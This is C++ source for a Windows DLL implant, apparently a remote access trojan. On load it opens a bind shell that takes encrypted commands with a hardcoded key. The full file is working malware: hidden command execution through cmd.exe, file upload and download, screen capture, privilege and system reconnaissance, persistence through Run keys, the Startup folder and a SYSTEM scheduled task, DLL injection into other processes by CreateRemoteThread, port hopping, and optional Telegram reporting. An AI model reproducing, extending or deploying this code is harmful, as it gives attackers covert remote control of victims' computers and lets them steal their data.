#define _WIN32_WINNT 0x0601
#include <iostream>
#include <fstream>
#include <string>
#include <cstring>
#include <cstdlib>
#include <winsock2.h>
#include <windows.h>
#include <tlhelp32.h>
#include <direct.h>
#include <thread>
#include <vector>
#include <sstream>
#include <iomanip>
#if defined(_MSC_VER)
#include <intrin.h>
#else
#include <cpuid.h>
#endif
#include "lib/crypto.h"
#include "lib/persist.h"
#include "shlobj.h"
#include "lib/telegram.h"

// #define TELEGRAM

#define BUFFER_SIZE 51192
#define FILE_BUFFER 8192
int DEFAULT_PORT = 4545;
#define SOCKET_TIMEOUT_MS 120000

AutoHopTelegram* g_telegram = nullptr;
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")

const unsigned char SECRET_KEY[] = "MyUltraSecureKey2024!@#$%Remote";
const int KEY_LEN = sizeof(SECRET_KEY) - 1;
CRITICAL_SECTION socket_cs;

SOCKET server_fd_global = INVALID_SOCKET;
int current_port = DEFAULT_PORT;
bool server_running = true;
HANDLE server_thread = NULL;
DWORD  g_owner_pid = 0;

#ifdef TELEGRAM
void InitTelegram() {
    g_telegram = new AutoHopTelegram();
    if (g_telegram->is_configured()) {
        int port = g_telegram->get_random_port();
        g_telegram->send_startup_message(port);
        current_port = port;
    } else {
        delete g_telegram;
        g_telegram = nullptr;
        current_port = DEFAULT_PORT;
    }
}
#endif

bool send_all(SOCKET sock, const char* data, int len, int timeout_ms = SOCKET_TIMEOUT_MS) {
    if (len <= 0 || sock == INVALID_SOCKET) return true;
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout_ms, sizeof(timeout_ms));
    int sent = 0;
    while (sent < len) {
        int n = send(sock, data + sent, len - sent, 0);
        if (n == SOCKET_ERROR) {
            int e = WSAGetLastError();
            if (e == WSAEWOULDBLOCK || e == WSAETIMEDOUT) { Sleep(10); continue; }
            return false;
        }
        if (n == 0) return false;
        sent += n;
    }
    return true;
}

int recv_all(SOCKET sock, char* buf, int len, int timeout_ms = SOCKET_TIMEOUT_MS) {
    if (len <= 0 || sock == INVALID_SOCKET) return 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout_ms, sizeof(timeout_ms));
    int got = 0;
    while (got < len) {
        int n = recv(sock, buf + got, len - got, 0);
        if (n == SOCKET_ERROR) {
            int e = WSAGetLastError();
            if (e == WSAEWOULDBLOCK || e == WSAETIMEDOUT) { Sleep(10); continue; }
            return -1;
        }
        if (n == 0) return -1;
        got += n;
    }
    return got;
}

void send_encrypted(SOCKET sock, Crypto* crypto, const char* data, int len) {
    if (len == 0 || sock == INVALID_SOCKET) return;
    unsigned char* enc = new unsigned char[len];
    memcpy(enc, data, len);
    crypto->encrypt(enc, len);
    send_all(sock, (char*)&len, sizeof(int));
    int off = 0, chunk = 8192;
    while (off < len) {
        int cur = (len - off) < chunk ? (len - off) : chunk;
        send_all(sock, (char*)enc + off, cur);
        off += cur;
        Sleep(1);
    }
    delete[] enc;
}

int recv_encrypted(SOCKET sock, Crypto* crypto, char* out) {
    if (sock == INVALID_SOCKET) return -1;
    int len = 0;
    if (recv_all(sock, (char*)&len, sizeof(int)) != sizeof(int)) return -1;
    if (len <= 0 || len > 100 * 1024 * 1024) return -1;
    unsigned char* enc = new unsigned char[len];
    int got = 0, chunk = 8192;
    while (got < len) {
        int cur = (len - got) < chunk ? (len - got) : chunk;
        int n = recv_all(sock, (char*)enc + got, cur);
        if (n != cur) { delete[] enc; return -1; }
        got += n;
    }
    crypto->decrypt(enc, len);
    memcpy(out, enc, len);
    delete[] enc;
    return len;
}

void start_new_port_listener(int new_port) {
    std::thread([new_port]() {
        WSADATA wsa; WSAStartup(MAKEWORD(2, 2), &wsa);
        SOCKET nsock = socket(AF_INET, SOCK_STREAM, 0);
        int reuse = 1;
        setsockopt(nsock, SOL_SOCKET, SO_REUSEADDR, (char*)&reuse, sizeof(reuse));
        sockaddr_in addr; addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(new_port);
        if (bind(nsock, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
            closesocket(nsock); WSACleanup(); return;
        }
        listen(nsock, 5);
        Sleep(1500);
        EnterCriticalSection(&socket_cs);
        SOCKET old = server_fd_global;
        server_fd_global = nsock;
        current_port = new_port;
        LeaveCriticalSection(&socket_cs);
        if (old != INVALID_SOCKET) closesocket(old);
    }).detach();
}

bool directory_exists(const std::string& p) {
    DWORD a = GetFileAttributesA(p.c_str());
    return (a != INVALID_FILE_ATTRIBUTES && (a & FILE_ATTRIBUTE_DIRECTORY));
}

DWORD find_process_by_name(const std::string& name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, name.c_str()) == 0 ||
                std::string(pe.szExeFile).find(name) != std::string::npos) {
                CloseHandle(snap);
                return pe.th32ProcessID;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return 0;
}

std::string get_integrity_level() {
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
        return "Unknown";
    DWORD len = 0;
    GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &len);
    if (!len) { CloseHandle(hToken); return "Unknown"; }
    PTOKEN_MANDATORY_LABEL pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0, len);
    if (!pTIL) { CloseHandle(hToken); return "Unknown"; }
    std::string result = "Unknown";
    if (GetTokenInformation(hToken, TokenIntegrityLevel, pTIL, len, &len)) {
        DWORD rid = *GetSidSubAuthority(pTIL->Label.Sid,
                        (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid) - 1));
        if      (rid < SECURITY_MANDATORY_LOW_RID)      result = "Untrusted";
        else if (rid < SECURITY_MANDATORY_MEDIUM_RID)   result = "Low";
        else if (rid < SECURITY_MANDATORY_HIGH_RID)     result = "Medium";
        else if (rid < SECURITY_MANDATORY_SYSTEM_RID)   result = "High";
        else                                             result = "System";
    }
    LocalFree(pTIL);
    CloseHandle(hToken);
    return result;
}

std::string get_token_user() {
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
        return "Unknown";
    DWORD len = 0;
    GetTokenInformation(hToken, TokenUser, NULL, 0, &len);
    PTOKEN_USER ptu = (PTOKEN_USER)LocalAlloc(0, len);
    std::string result = "Unknown";
    if (ptu && GetTokenInformation(hToken, TokenUser, ptu, len, &len)) {
        char name[256] = {}, dom[256] = {};
        DWORD nlen = 256, dlen = 256;
        SID_NAME_USE use;
        if (LookupAccountSidA(NULL, ptu->User.Sid, name, &nlen, dom, &dlen, &use))
            result = std::string(dom) + "\\" + name;
    }
    if (ptu) LocalFree(ptu);
    CloseHandle(hToken);
    return result;
}

bool is_elevated() {
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) return false;
    TOKEN_ELEVATION elev; DWORD len = sizeof(elev);
    bool elevated = false;
    if (GetTokenInformation(hToken, TokenElevation, &elev, sizeof(elev), &len))
        elevated = (elev.TokenIsElevated != 0);
    CloseHandle(hToken);
    return elevated;
}

std::string get_parent_process_name(DWORD ppid) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return "unknown";
    PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
    std::string name = "unknown";
    if (Process32First(snap, &pe)) {
        do {
            if (pe.th32ProcessID == ppid) { name = pe.szExeFile; break; }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return name;
}

std::string get_current_process_info() {
    DWORD pid = GetCurrentProcessId();
    char exePath[MAX_PATH] = "unknown";
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    std::string procName = "unknown";
    DWORD ppid = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
        if (Process32First(snap, &pe)) {
            do {
                if (pe.th32ProcessID == pid) {
                    procName = pe.szExeFile;
                    ppid = pe.th32ParentProcessID;
                    break;
                }
            } while (Process32Next(snap, &pe));
        }
        CloseHandle(snap);
    }

    std::string integrity  = get_integrity_level();
    std::string tokenUser  = get_token_user();
    bool elevated          = is_elevated();
    std::string parentName = get_parent_process_name(ppid);

    BOOL isWow64 = FALSE;
    typedef BOOL(WINAPI* FnIsWow64)(HANDLE, PBOOL);
    FnIsWow64 fnWow = (FnIsWow64)GetProcAddress(GetModuleHandleA("kernel32"), "IsWow64Process");
    if (fnWow) fnWow(GetCurrentProcess(), &isWow64);
    SYSTEM_INFO si; GetNativeSystemInfo(&si);
    bool is64bit = (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) && !isWow64;

    std::string r;
    r  = "\n[+] Current Process\n";
    r += "==================================================\n";
    r += " PID          : " + std::to_string(pid) + "\n";
    r += " Name         : " + procName + "\n";
    r += " Path         : " + std::string(exePath) + "\n";
    r += " Parent PID   : " + std::to_string(ppid) + " (" + parentName + ")\n";
    r += " User         : " + tokenUser + "\n";
    r += " Elevated     : " + std::string(elevated ? "YES" : "NO") + "\n";
    r += " Integrity    : " + integrity + "\n";
    r += " Architecture : " + std::string(is64bit ? "x64" : "x86 (WOW64)") + "\n";
    r += "==================================================\n";
    return r;
}

std::string list_processes() {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return "[-] Failed to get process list\n";
    PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
    std::string r = "\n[+] Running Processes:\n";
    r += "==================================================\n";
    r += " PID       PPID      Name\n";
    r += "==================================================\n";
    if (Process32First(snap, &pe)) {
        do {
            char line[300];
            sprintf_s(line, " %-8d  %-8d  %s\n",
                pe.th32ProcessID, pe.th32ParentProcessID, pe.szExeFile);
            r += line;
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    r += "==================================================\n";
    return r;
}

std::string migrate(const std::string& target) {
    char dllPath[MAX_PATH] = {0};
    HMODULE hSelf = NULL;
    GetModuleHandleExA(
        GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS |
        GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
        (LPCSTR)&migrate, &hSelf);
    GetModuleFileNameA(hSelf, dllPath, MAX_PATH);

    if (dllPath[0] == '\0')
        return "[-] Could not resolve DLL path\n";

    DWORD targetPid = 0;
    bool is_numeric = true;
    for (char c : target) { if (!isdigit((unsigned char)c)) { is_numeric = false; break; } }
    if (is_numeric && !target.empty())
        targetPid = (DWORD)atoi(target.c_str());
    else
        targetPid = find_process_by_name(target);

    if (targetPid == 0)
        return "[-] Process not found: " + target + "\n";
    if (targetPid == GetCurrentProcessId())
        return "[-] Cannot migrate to self\n";

    HANDLE hProc = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION  | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE, targetPid);
    if (!hProc)
        return "[-] OpenProcess failed (PID " + std::to_string(targetPid) +
               ") — error " + std::to_string(GetLastError()) + "\n";

    BOOL targetWow = FALSE;
    typedef BOOL(WINAPI* FnIsWow64)(HANDLE, PBOOL);
    FnIsWow64 fnWow = (FnIsWow64)GetProcAddress(GetModuleHandleA("kernel32"), "IsWow64Process");
    if (fnWow) fnWow(hProc, &targetWow);
    BOOL selfWow = FALSE;
    if (fnWow) fnWow(GetCurrentProcess(), &selfWow);
    if (targetWow != selfWow) {
        CloseHandle(hProc);
        return "[-] Architecture mismatch: cannot inject x64 DLL into x86 process or vice versa\n";
    }

    size_t pathLen = strlen(dllPath) + 1;
    LPVOID remote  = VirtualAllocEx(hProc, NULL, pathLen,
                                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remote) {
        CloseHandle(hProc);
        return "[-] VirtualAllocEx failed — error " + std::to_string(GetLastError()) + "\n";
    }

    if (!WriteProcessMemory(hProc, remote, dllPath, pathLen, NULL)) {
        VirtualFreeEx(hProc, remote, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return "[-] WriteProcessMemory failed — error " + std::to_string(GetLastError()) + "\n";
    }

    FARPROC loadLib = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    HANDLE hThread  = CreateRemoteThread(hProc, NULL, 0,
                                         (LPTHREAD_START_ROUTINE)loadLib,
                                         remote, 0, NULL);
    if (!hThread) {
        VirtualFreeEx(hProc, remote, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return "[-] CreateRemoteThread failed — error " + std::to_string(GetLastError()) + "\n";
    }

    WaitForSingleObject(hThread, 8000);

    DWORD exitCode = 0;
    GetExitCodeThread(hThread, &exitCode);
    CloseHandle(hThread);
    VirtualFreeEx(hProc, remote, 0, MEM_RELEASE);
    CloseHandle(hProc);

    if (exitCode == 0)
        return "[-] LoadLibraryA returned NULL in target — DLL load failed\n";

    EnterCriticalSection(&socket_cs);
    if (server_fd_global != INVALID_SOCKET) {
        closesocket(server_fd_global);
        server_fd_global = INVALID_SOCKET;
    }
    server_running = false;
    LeaveCriticalSection(&socket_cs);

    Sleep(800);

    return "[+] Migrated to PID " + std::to_string(targetPid) +
           " (" + target + ") — module base 0x" +
           [&]{ std::ostringstream ss; ss << std::hex << exitCode; return ss.str(); }() +
           "\n    Old listener released. New process should now be listening.\n";
}

std::string get_sysinfo() {
    char hostname[256] = {}, username[256] = {};
    DWORD hn = 256, un = 256;
    GetComputerNameA(hostname, &hn);
    GetUserNameA(username, &un);

    typedef NTSTATUS(WINAPI* FnRtlGetVer)(OSVERSIONINFOEXA*);
    FnRtlGetVer RtlGetVersion = (FnRtlGetVer)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "RtlGetVersion");
    OSVERSIONINFOEXA ovi = {0}; ovi.dwOSVersionInfoSize = sizeof(ovi);
    if (RtlGetVersion) RtlGetVersion(&ovi);
    char osver[128];
    sprintf_s(osver, "Windows %lu.%lu Build %lu SP%d",
              ovi.dwMajorVersion, ovi.dwMinorVersion,
              ovi.dwBuildNumber, ovi.wServicePackMajor);

    MEMORYSTATUSEX ms; ms.dwLength = sizeof(ms); GlobalMemoryStatusEx(&ms);

    char cpuBrand[49] = {0};
    int cpuInfo[4] = {0};
#if defined(_MSC_VER)
    __cpuid(cpuInfo, 0x80000002);
    memcpy(cpuBrand,      cpuInfo, 16);
    __cpuid(cpuInfo, 0x80000003);
    memcpy(cpuBrand + 16, cpuInfo, 16);
    __cpuid(cpuInfo, 0x80000004);
    memcpy(cpuBrand + 32, cpuInfo, 16);
#else
    unsigned int eax, ebx, ecx, edx;
    if (__get_cpuid(0x80000002, &eax, &ebx, &ecx, &edx)) {
        memcpy(cpuBrand,      &eax, 4);
        memcpy(cpuBrand + 4,  &ebx, 4);
        memcpy(cpuBrand + 8,  &ecx, 4);
        memcpy(cpuBrand + 12, &edx, 4);
    }
    if (__get_cpuid(0x80000003, &eax, &ebx, &ecx, &edx)) {
        memcpy(cpuBrand + 16, &eax, 4);
        memcpy(cpuBrand + 20, &ebx, 4);
        memcpy(cpuBrand + 24, &ecx, 4);
        memcpy(cpuBrand + 28, &edx, 4);
    }
    if (__get_cpuid(0x80000004, &eax, &ebx, &ecx, &edx)) {
        memcpy(cpuBrand + 32, &eax, 4);
        memcpy(cpuBrand + 36, &ebx, 4);
        memcpy(cpuBrand + 40, &ecx, 4);
        memcpy(cpuBrand + 44, &edx, 4);
    }
#endif

    SYSTEM_INFO si; GetNativeSystemInfo(&si);

    std::string r;
    r  = "\n[+] System Information\n";
    r += "==================================================\n";
    r += " Hostname     : " + std::string(hostname) + "\n";
    r += " Username     : " + std::string(username) + "\n";
    r += " OS           : " + std::string(osver) + "\n";
    r += " CPU          : " + std::string(cpuBrand) + "\n";
    r += " CPU Cores    : " + std::to_string(si.dwNumberOfProcessors) + "\n";
    r += " RAM Total    : " + std::to_string(ms.ullTotalPhys / 1024 / 1024) + " MB\n";
    r += " RAM Free     : " + std::to_string(ms.ullAvailPhys / 1024 / 1024) + " MB\n";
    r += " Arch         : " +
         std::string(si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ? "x64" : "x86")
         + "\n";
    r += " Elevated     : " + std::string(is_elevated() ? "YES" : "NO") + "\n";
    r += " Integrity    : " + get_integrity_level() + "\n";
    r += "==================================================\n";
    return r;
}

std::string take_screenshot(const std::string& current_dir) {
    int w = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int h = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    int x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int y = GetSystemMetrics(SM_YVIRTUALSCREEN);

    HDC hScreen = GetDC(NULL);
    HDC hDC     = CreateCompatibleDC(hScreen);
    HBITMAP hBmp = CreateCompatibleBitmap(hScreen, w, h);
    SelectObject(hDC, hBmp);
    BitBlt(hDC, 0, 0, w, h, hScreen, x, y, SRCCOPY);

    char tmpPath[MAX_PATH], tmpFile[MAX_PATH];
    GetTempPathA(MAX_PATH, tmpPath);
    sprintf_s(tmpFile, "%s\\scr_%lu.bmp", tmpPath, GetCurrentProcessId());

    BITMAPFILEHEADER bfh = {0};
    BITMAPINFOHEADER bih = {0};
    bih.biSize          = sizeof(bih);
    bih.biWidth         = w;
    bih.biHeight        = -h;
    bih.biPlanes        = 1;
    bih.biBitCount      = 24;
    bih.biCompression   = BI_RGB;
    int rowSize         = ((w * 3 + 3) & ~3);
    bih.biSizeImage     = rowSize * h;
    bfh.bfType          = 0x4D42;
    bfh.bfOffBits       = sizeof(bfh) + sizeof(bih);
    bfh.bfSize          = bfh.bfOffBits + bih.biSizeImage;

    std::vector<BYTE> pixels(bih.biSizeImage, 0);
    GetDIBits(hDC, hBmp, 0, h, pixels.data(), (BITMAPINFO*)&bih, DIB_RGB_COLORS);

    DeleteObject(hBmp);
    DeleteDC(hDC);
    ReleaseDC(NULL, hScreen);

    std::ofstream f(tmpFile, std::ios::binary);
    if (!f) return "[-] Failed to create screenshot file\n";
    f.write((char*)&bfh, sizeof(bfh));
    f.write((char*)&bih, sizeof(bih));
    f.write((char*)pixels.data(), pixels.size());
    f.close();

    return std::string("SCREENSHOT_FILE:") + tmpFile;
}

std::string do_persist() {
    Persist::Install();
    return "[+] Persistence installed (RunKey + Startup folder" +
           std::string(Persist::IsAdmin() ? " + SYSTEM scheduled task" : "") + ")\n";
}

std::string execute_command(const std::string& cmd, std::string& current_dir) {
    std::string result;

    if (cmd.rfind("cd ", 0) == 0) {
        std::string np = cmd.substr(3);
        while (!np.empty() && np[0] == ' ') np.erase(0, 1);
        std::string tp;
        if (np == "..") {
            size_t pos = current_dir.find_last_of("\\/");
            tp = (pos != std::string::npos) ? current_dir.substr(0, pos) : "C:\\";
            if (tp.empty() || (tp.size() == 2 && tp[1] == ':')) tp += "\\";
        } else if (np == "." ) {
            tp = current_dir;
        } else if (np == "\\" || np == "/") {
            tp = "C:\\";
        } else {
            tp = (np.size() >= 2 && np[1] == ':') ? np : current_dir + "\\" + np;
        }
        while (!tp.empty() && tp.back() == ' ') tp.pop_back();
        if (directory_exists(tp)) {
            current_dir = tp;
            return "[Directory changed to: " + current_dir + "]\n";
        }
        return "[ERROR] Directory not found: " + np + "\n";
    }

    char tmpPath[MAX_PATH], tmpFile[MAX_PATH];
    GetTempPathA(MAX_PATH, tmpPath);
    sprintf_s(tmpFile, "%s\\~cmd_%lu.txt", tmpPath, GetCurrentProcessId());

    std::string full = "C:\\Windows\\System32\\cmd.exe /c cd /d \"" +
                       current_dir + "\" && " + cmd + " > \"" + tmpFile + "\" 2>&1";
    STARTUPINFOA si; ZeroMemory(&si, sizeof(si));
    PROCESS_INFORMATION pi; ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(si); si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
    char cmdLine[BUFFER_SIZE]; strcpy_s(cmdLine, full.c_str());

    if (CreateProcessA("C:\\Windows\\System32\\cmd.exe", cmdLine,
                       NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 60000);
        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        std::ifstream f(tmpFile, std::ios::binary | std::ios::ate);
        if (f) {
            size_t fsz = f.tellg(); f.seekg(0);
            if (fsz > 50*1024*1024) { result = "[Output truncated at 50MB]\n"; fsz = 50*1024*1024; }
            std::vector<char> d(fsz+1, 0);
            f.read(d.data(), fsz);
            result += std::string(d.data());
            f.close();
        }
        DeleteFileA(tmpFile);
    } else {
        result = "ERROR: CreateProcess failed (" + std::to_string(GetLastError()) + ")\n";
    }
    if (result.empty()) result = "[Command executed successfully — no output]\n";
    return result;
}

bool upload_file(SOCKET fd, Crypto* c, const std::string& filename, std::string& cdir) {
    std::string name = filename;
    size_t p = name.find_last_of("\\/");
    if (p != std::string::npos) name = name.substr(p+1);
    std::string path = cdir + "\\" + name;
    std::ofstream f(path, std::ios::binary);
    if (!f) { send_encrypted(fd, c, "ERROR: Cannot create file", 25); return false; }
    send_encrypted(fd, c, "READY", 5);
    char buf[FILE_BUFFER];
    while (true) {
        memset(buf, 0, FILE_BUFFER);
        int n = recv_encrypted(fd, c, buf);
        if (n <= 0) break;
        if (n == 3 && strncmp(buf, "EOF", 3) == 0) break;
        f.write(buf, n);
    }
    f.close();
    send_encrypted(fd, c, "UPLOAD_SUCCESS", 14);
    return true;
}

bool download_file(SOCKET fd, Crypto* c, const std::string& filename, std::string& cdir) {
    std::string path = cdir + "\\" + filename;
    std::ifstream f(path, std::ios::binary);
    if (!f) { send_encrypted(fd, c, "ERROR: File not found", 21); return false; }
    f.seekg(0, std::ios::end); long sz = f.tellg(); f.seekg(0);
    std::string sstr = std::to_string(sz);
    send_encrypted(fd, c, sstr.c_str(), sstr.size());
    char rdy[10]; recv_encrypted(fd, c, rdy);
    char buf[FILE_BUFFER];
    while (f.read(buf, FILE_BUFFER) || f.gcount() > 0) {
        send_encrypted(fd, c, buf, (int)f.gcount());
        Sleep(10);
    }
    f.close();
    send_encrypted(fd, c, "EOF", 3);
    return true;
}

bool send_temp_file(SOCKET fd, Crypto* c, const std::string& path) {
    std::ifstream f(path, std::ios::binary);
    if (!f) { send_encrypted(fd, c, "ERROR: File not found", 21); return false; }
    f.seekg(0, std::ios::end); long sz = f.tellg(); f.seekg(0);
    std::string sstr = std::to_string(sz);
    send_encrypted(fd, c, sstr.c_str(), sstr.size());
    char rdy[10]; recv_encrypted(fd, c, rdy);
    char buf[FILE_BUFFER];
    while (f.read(buf, FILE_BUFFER) || f.gcount() > 0) {
        send_encrypted(fd, c, buf, (int)f.gcount());
        Sleep(10);
    }
    f.close();
    send_encrypted(fd, c, "EOF", 3);
    DeleteFileA(path.c_str());
    return true;
}

void handle_client(SOCKET client_fd) {
    Crypto* crypto = new Crypto(SECRET_KEY, KEY_LEN);
    char buffer[BUFFER_SIZE * 4];
    std::string current_dir;
    char cwd[BUFFER_SIZE];
    if (_getcwd(cwd, sizeof(cwd))) current_dir = cwd;
    else current_dir = "C:\\";

    int errs = 0;
    while (server_running && errs < 5) {
        memset(buffer, 0, BUFFER_SIZE * 4);
        int n = recv_encrypted(client_fd, crypto, buffer);
        if (n <= 0) { errs++; Sleep(1000); continue; }
        errs = 0;

        std::string cmd(buffer, n);
        while (!cmd.empty() && (cmd.back() == '\n' || cmd.back() == '\r')) cmd.pop_back();
        if (cmd.empty()) continue;

        std::string output;

        if (cmd == "ps" || cmd == "tasklist") {
            output = list_processes();
        }
        else if (cmd == "me" || cmd == "ME" || cmd == "whoami") {
            output = get_current_process_info();
        }
        else if (cmd == "sysinfo" || cmd == "SYSINFO") {
            output = get_sysinfo();
        }
        else if (cmd == "persist") {
            output = do_persist();
        }
        else if (cmd == "screenshot") {
            std::string res = take_screenshot(current_dir);
            if (res.rfind("SCREENSHOT_FILE:", 0) == 0) {
                std::string fpath = res.substr(16);
                std::string signal = "SCREENSHOT_READY";
                send_encrypted(client_fd, crypto, signal.c_str(), (int)signal.size());
                send_temp_file(client_fd, crypto, fpath);
            } else {
                send_encrypted(client_fd, crypto, res.c_str(), (int)res.size());
            }
            continue;
        }
        else if (cmd.rfind("migrate ", 0) == 0) {
            std::string target = cmd.substr(8);
            while (!target.empty() && target[0] == ' ') target.erase(0, 1);
            output = migrate(target);
            send_encrypted(client_fd, crypto, output.c_str(), (int)output.size());
            break;
        }
        else if (cmd == "migrate") {
            output = "Usage: migrate <PID|process_name>\n"
                     "Example: migrate 1234\n"
                     "Example: migrate notepad.exe\n";
        }
        else if (cmd.rfind("hop ", 0) == 0) {
            int new_port = 0;
            try { new_port = std::stoi(cmd.substr(4)); } catch (...) {}
            if (new_port > 0 && new_port < 65536) {
                std::string ack = "HOP_READY";
                send_encrypted(client_fd, crypto, ack.c_str(), (int)ack.size());
                char client_ack[16] = {0};
                recv_encrypted(client_fd, crypto, client_ack);
                int old_port = current_port;
                start_new_port_listener(new_port);
                output = "[+] Hopping to port " + std::to_string(new_port) +
                         " — reconnect within 5 seconds\n";
                send_encrypted(client_fd, crypto, output.c_str(), (int)output.size());
                if (g_telegram) g_telegram->send_hop_message(old_port, new_port);
                delete crypto;
                crypto = new Crypto(SECRET_KEY, KEY_LEN);
            } else {
                output = "[-] Invalid port\n";
                send_encrypted(client_fd, crypto, output.c_str(), (int)output.size());
            }
        }
        else if (cmd == "hop") {
            output = "Usage: hop <port>\nExample: hop 5555\n";
        }
        else if (cmd == "pwd" || cmd == "PWD") {
            output = "Current directory: " + current_dir + "\n";
        }
        else if (cmd.rfind("UPLOAD:", 0) == 0) {
            upload_file(client_fd, crypto, cmd.substr(7), current_dir);
            continue;
        }
        else if (cmd.rfind("DOWNLOAD:", 0) == 0) {
            download_file(client_fd, crypto, cmd.substr(9), current_dir);
            continue;
        }
        else if (cmd == "CRYPTO_SYNC") {
            crypto->reset();
            send_encrypted(client_fd, crypto, "SYNC_OK", 7);
            continue;
        }
        else if (cmd == "exit" || cmd == "quit") {
            output = "Goodbye!\n";
            send_encrypted(client_fd, crypto, output.c_str(), (int)output.size());
            break;
        }
        else {
            output = execute_command(cmd, current_dir);
        }

        if (!output.empty())
            send_encrypted(client_fd, crypto, output.c_str(), (int)output.size());
    }

    delete crypto;
    closesocket(client_fd);
}

DWORD WINAPI server_thread_func(LPVOID) {
    WSADATA wsa; WSAStartup(MAKEWORD(2, 2), &wsa);

    int attempts = 0;
    const int max_attempts = 20;
    while (attempts < max_attempts) {
        server_fd_global = socket(AF_INET, SOCK_STREAM, 0);
        if (server_fd_global == INVALID_SOCKET) { Sleep(500); attempts++; continue; }

        int reuse = 1;
        setsockopt(server_fd_global, SOL_SOCKET, SO_REUSEADDR, (char*)&reuse, sizeof(reuse));

        sockaddr_in addr; addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(current_port);

        if (bind(server_fd_global, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
            closesocket(server_fd_global);
            server_fd_global = INVALID_SOCKET;
            Sleep(500);
            attempts++;
            continue;
        }
        break;
    }

    if (server_fd_global == INVALID_SOCKET) {
        current_port += 1;
        server_fd_global = socket(AF_INET, SOCK_STREAM, 0);
        int reuse = 1;
        setsockopt(server_fd_global, SOL_SOCKET, SO_REUSEADDR, (char*)&reuse, sizeof(reuse));
        sockaddr_in addr; addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(current_port);
        if (bind(server_fd_global, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
            return 1;
        }
    }

    listen(server_fd_global, 5);
    while (server_running) {
        sockaddr_in caddr; int clen = sizeof(caddr);
        SOCKET cfd = accept(server_fd_global, (sockaddr*)&caddr, &clen);
        if (cfd != INVALID_SOCKET)
            handle_client(cfd);
        if (!server_running) break;
    }
    if (server_fd_global != INVALID_SOCKET) closesocket(server_fd_global);
    WSACleanup();
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID) {
    switch (reason) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        InitializeCriticalSection(&socket_cs);
        if (g_owner_pid == 0) g_owner_pid = GetCurrentProcessId();
        #ifdef TELEGRAM
            InitTelegram();
        #endif
        server_thread = CreateThread(NULL, 0, server_thread_func, NULL, 0, NULL);
        break;
    case DLL_PROCESS_DETACH:
        server_running = false;
        EnterCriticalSection(&socket_cs);
        if (server_fd_global != INVALID_SOCKET) {
            closesocket(server_fd_global);
            server_fd_global = INVALID_SOCKET;
        }
        LeaveCriticalSection(&socket_cs);
        DeleteCriticalSection(&socket_cs);
        if (server_thread) { WaitForSingleObject(server_thread, 5000); CloseHandle(server_thread); }
        if (g_telegram) { delete g_telegram; g_telegram = nullptr; }
        break;
    }
    return TRUE;
}